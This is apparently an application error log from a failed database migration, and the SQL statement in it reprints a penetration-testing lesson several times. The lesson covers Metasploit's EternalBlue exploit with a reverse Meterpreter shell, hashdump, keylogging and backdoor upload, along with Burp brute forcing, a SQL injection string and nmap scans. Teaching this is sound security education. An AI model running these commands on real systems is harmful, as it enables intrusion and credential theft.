msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

